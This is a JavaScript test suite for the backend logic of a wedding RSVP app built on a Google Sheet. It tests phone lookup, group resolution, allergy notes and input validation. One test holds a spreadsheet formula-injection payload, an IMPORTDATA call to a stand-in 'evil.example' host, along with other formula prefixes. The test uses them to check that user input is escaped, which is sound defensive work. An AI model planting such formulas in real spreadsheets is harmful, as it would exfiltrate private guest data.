const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const sandbox = {};
vm.createContext(sandbox);
vm.runInContext(
  fs.readFileSync(path.join(__dirname, "..", "apps-script", "logic.gs"), "utf8"),
  sandbox
);
const {
  phoneKey, phoneTail, readAttending, writeAttending,
  readAllergies, writeAllergies, resolveHeaders, findGroup,
  buildLookupResponse, validateResponses, constantTimeEquals,
} = sandbox;

const HEADER = ["Column 1", "Nombre", "Bride or Groom", "Phone #", "Group ID", "RVSP", "Allergies"];
const H = () => resolveHeaders(HEADER);
// [Column 1, Nombre, Side, Phone, GroupID, RVSP, Allergies]
const ROWS = [
  ["", "Ana García",  "Bride", "+34 612 345 678", "G1", "Yes",         "seafood"],
  ["", "Luis García", "Bride", "612345678",       "G1", "No Response", "No allergies"],
  ["", "Sam Smith",   "Groom", "+1 555 000 1111", "G2", "No",          "No allergies"],
  ["", "",            "",      "+34612345678",    "G1", "",            ""],
];

test("phoneKey strips everything but digits", () => {
  assert.equal(phoneKey("+34 612-345-678"), "34612345678");
  assert.equal(phoneKey(""), "");
  assert.equal(phoneKey(null), "");
});

test("phoneTail takes the last 9 digits", () => {
  assert.equal(phoneTail("+34 612 345 678"), "612345678");
  assert.equal(phoneTail("612345678"), "612345678");
  assert.equal(phoneTail("12345"), "");
});

test("readAttending maps sheet values to the API vocabulary", () => {
  assert.equal(readAttending("Yes"), "yes");
  assert.equal(readAttending("sí"), "yes");
  assert.equal(readAttending("SI"), "yes");
  assert.equal(readAttending("no"), "no");
  assert.equal(readAttending("No Response"), null);
  assert.equal(readAttending(""), null);
});

test("writeAttending maps back to sheet values", () => {
  assert.equal(writeAttending("yes"), "Yes");
  assert.equal(writeAttending("no"), "No");
});

test("allergies round-trip through the default string", () => {
  assert.equal(readAllergies("No allergies"), "");
  assert.equal(readAllergies("seafood"), "seafood");
  assert.equal(writeAllergies(""), "No allergies");
  assert.equal(writeAllergies("seafood"), "seafood");
});

test("writeAllergies neutralises every Sheets formula prefix", () => {
  // A leading =, +, - or @ makes Range.setValue() store a live FORMULA, which
  // would run with the sheet owner's authority (=IMPORTDATA exfiltrates the
  // guest list; =A1:Z999 spills over the neighbouring summary formulas).
  assert.equal(writeAllergies('=IMPORTDATA("https://evil.example/x")'), "'=IMPORTDATA(\"https://evil.example/x\")");
  assert.equal(writeAllergies("-peanuts"), "'-peanuts");
  assert.equal(writeAllergies("+shellfish"), "'+shellfish");
  assert.equal(writeAllergies("@gluten"), "'@gluten");
  assert.equal(writeAllergies("  =A1:Z999  "), "'=A1:Z999");
});

test("writeAllergies leaves ordinary text untouched", () => {
  assert.equal(writeAllergies("seafood"), "seafood");
  assert.equal(writeAllergies("  nuts, dairy  "), "nuts, dairy");
  assert.equal(writeAllergies("no = sign at the start"), "no = sign at the start");
});

test("writeAllergies caps the note at 500 characters", () => {
  const long = "a".repeat(600);
  assert.equal(writeAllergies(long).length, 500);
  assert.equal(writeAllergies(long), "a".repeat(500));
  // Exactly 500 is kept whole.
  assert.equal(writeAllergies("b".repeat(500)).length, 500);
});

test("the escaping apostrophe round-trips through readAllergies", () => {
  ["-peanuts", "=nuts", "+dairy", "@soy"].forEach((note) => {
    assert.equal(readAllergies(writeAllergies(note)), note);
  });
  // Only one apostrophe is stripped, so a note the guest actually typed with a
  // quote is not eaten twice.
  assert.equal(readAllergies("''-peanuts"), "'-peanuts");
  assert.equal(readAllergies("seafood"), "seafood");
});

test("resolveHeaders finds columns by name and throws on a missing one", () => {
  const h = H();
  assert.equal(h.nombre, 1);
  assert.equal(h.phone, 3);
  assert.equal(h.rvsp, 5);
  // Throws on the first missing header in REQUIRED_HEADERS order.
  assert.throws(() => resolveHeaders(["Nombre", "Phone #"]), /Bride or Groom/);
});

test("findGroup matches an exact phone and returns the whole group", () => {
  assert.deepEqual(findGroup(ROWS, H(), "+34612345678"), [0, 1]);
});

test("findGroup falls back to the 9-digit tail when nothing matches exactly", () => {
  // "1612345678" matches no row exactly; the tail "612345678" matches both G1
  // rows, so the tail path is what resolves this.
  assert.deepEqual(findGroup(ROWS, H(), "+1 612 345 678"), [0, 1]);
});

test("findGroup returns empty for an unknown number", () => {
  assert.deepEqual(findGroup(ROWS, H(), "+34999999999"), []);
});

test("findGroup refuses an ambiguous tail match across groups", () => {
  const rows = [
    ["", "A", "Bride", "+34612345678", "G1", "No Response", ""],
    ["", "B", "Groom", "+1612345678",  "G2", "No Response", ""],
  ];
  assert.deepEqual(findGroup(rows, H(), "612345678"), []);
});

test("findGroup rejects ambiguous blank Group IDs", () => {
  // Two unrelated rows with empty Group ID and matching phone tail should
  // not be resolved (would leak a stranger's name).
  const rows = [
    ["", "A", "Bride", "+34612345678", "", "Yes", ""],
    ["", "B", "Groom", "+1612345678",  "", "No Response", ""],
  ];
  assert.deepEqual(findGroup(rows, H(), "612345678"), []);
});

test("findGroup resolves a single row with blank Group ID", () => {
  // One row with empty Group ID and a matching phone can be resolved as that
  // guest alone (not part of a group).
  const rows = [
    ["", "A", "Bride", "+34612345678", "", "Yes", ""],
  ];
  assert.deepEqual(findGroup(rows, H(), "+34612345678"), [0]);
});

test("findGroup ignores the blank trailing row", () => {
  // ROWS[3] has blank name, matching phone (+34612345678), and same Group ID (G1)
  // as rows 0-1. Without the isBlankRow skip, it would be included in the group.
  // The test confirms that blank-name rows are filtered out even when they match.
  assert.ok(!findGroup(ROWS, H(), "+34612345678").includes(3));
  assert.deepEqual(findGroup(ROWS, H(), ""), []);
});

test("buildLookupResponse exposes names and status but never phone or group id", () => {
  const out = buildLookupResponse(ROWS, H(), [0, 1]);
  assert.deepEqual(out.group, [
    { name: "Ana García", attending: "yes" },
    { name: "Luis García", attending: null },
  ]);
  assert.equal(out.notes, "seafood");
  const blob = JSON.stringify(out);
  assert.ok(!blob.includes("612345678"), "phone leaked");
  assert.ok(!blob.includes("G1"), "group id leaked");
});

test("buildLookupResponse omits the default allergies string", () => {
  assert.equal(buildLookupResponse(ROWS, H(), [2]).notes, "");
});

test("buildLookupResponse joins every distinct note in the group", () => {
  // The one notes field is written back to every member's row on submit, so a
  // note that lookup did not show would be destroyed.
  const rows = [
    ["", "Ana",  "Bride", "+34600000001", "G9", "Yes", "nuts"],
    ["", "Luis", "Bride", "+34600000001", "G9", "Yes", "shellfish"],
  ];
  assert.equal(buildLookupResponse(rows, H(), [0, 1]).notes, "nuts; shellfish");
});

test("buildLookupResponse does not repeat a note the group shares", () => {
  const rows = [
    ["", "Ana",  "Bride", "+34600000001", "G9", "Yes", "nuts"],
    ["", "Luis", "Bride", "+34600000001", "G9", "Yes", "nuts"],
  ];
  assert.equal(buildLookupResponse(rows, H(), [0, 1]).notes, "nuts");
});

test("buildLookupResponse skips blank and default notes when joining", () => {
  const rows = [
    ["", "Ana",  "Bride", "+34600000001", "G9", "Yes", "nuts"],
    ["", "Luis", "Bride", "+34600000001", "G9", "Yes", ""],
    ["", "Mia",  "Bride", "+34600000001", "G9", "Yes", "No allergies"],
  ];
  assert.equal(buildLookupResponse(rows, H(), [0, 1, 2]).notes, "nuts");
  assert.equal(buildLookupResponse(rows, H(), [1, 2]).notes, "");
});

test("buildLookupResponse does not re-append a note already inside a joined cell", () => {
  // script.js only submits CHECKED rows, so a partial submit writes the joined
  // string to some rows and leaves the others holding their original note. If
  // dedup compared whole cell values, "nuts; wheat" and "wheat" would look
  // distinct and every later lookup would append another "; wheat" until
  // MAX_ALLERGIES_LEN truncated the note away.
  const rows = [
    ["", "Ana",  "Bride", "+34600000001", "G9", "Yes", "nuts; wheat"],
    ["", "Luis", "Bride", "+34600000001", "G9", "Yes", "nuts; wheat"],
    ["", "Mia",  "Bride", "+34600000001", "G9", "Yes", "wheat"],
  ];
  assert.equal(buildLookupResponse(rows, H(), [0, 1, 2]).notes, "nuts; wheat");
});

test("buildLookupResponse is idempotent over an already-joined group", () => {
  // Re-joining a group whose cells all hold the joined value must return that
  // same value, so repeated partial submits converge instead of growing.
  const rows = [
    ["", "Ana",  "Bride", "+34600000001", "G9", "Yes", "nuts; wheat"],
    ["", "Luis", "Bride", "+34600000001", "G9", "Yes", "nuts; wheat"],
  ];
  const once = buildLookupResponse(rows, H(), [0, 1]).notes;
  assert.equal(once, "nuts; wheat");
  // Feeding the output back in as every member's cell is a fixed point.
  const again = [
    ["", "Ana",  "Bride", "+34600000001", "G9", "Yes", once],
    ["", "Luis", "Bride", "+34600000001", "G9", "Yes", once],
  ];
  assert.equal(buildLookupResponse(again, H(), [0, 1]).notes, once);
});

test("validateResponses rejects more responses than the group has members", () => {
  // 20,000 copies of one answer would issue 40,000 setValue calls and burn the
  // daily quota, taking RSVP down for everyone.
  const flood = Array.from({ length: 20000 }, () => ({ i: 0, attending: "yes" }));
  assert.deepEqual(validateResponses([0, 1], flood), { ok: false, error: "too_many" });
  assert.equal(validateResponses([0, 1], [
    { i: 0, attending: "yes" },
    { i: 1, attending: "no" },
    { i: 0, attending: "yes" },
  ]).error, "too_many");
});

test("validateResponses rejects a repeated index", () => {
  assert.deepEqual(
    validateResponses([0, 1], [{ i: 0, attending: "yes" }, { i: 0, attending: "no" }]),
    { ok: false, error: "duplicate_index" }
  );
  // Distinct indexes still pass.
  assert.deepEqual(
    validateResponses([0, 1], [{ i: 0, attending: "yes" }, { i: 1, attending: "no" }]),
    { ok: true }
  );
});

test("validateResponses rejects out-of-range and malformed indexes", () => {
  assert.deepEqual(validateResponses([0, 1], [{ i: 0, attending: "yes" }]), { ok: true });
  assert.equal(validateResponses([0, 1], [{ i: 2, attending: "yes" }]).ok, false);
  assert.equal(validateResponses([0, 1], [{ i: -1, attending: "yes" }]).ok, false);
  assert.equal(validateResponses([0, 1], [{ i: 0, attending: "maybe" }]).ok, false);
  assert.equal(validateResponses([0, 1], []).ok, false);
  assert.equal(validateResponses([0, 1], "nope").ok, false);
});

test("constantTimeEquals is correct and length-safe", () => {
  assert.equal(constantTimeEquals("abc", "abc"), true);
  assert.equal(constantTimeEquals("abc", "abd"), false);
  assert.equal(constantTimeEquals("abc", "abcd"), false);
  assert.equal(constantTimeEquals("", ""), true);
  assert.equal(constantTimeEquals("abc", null), false);
});
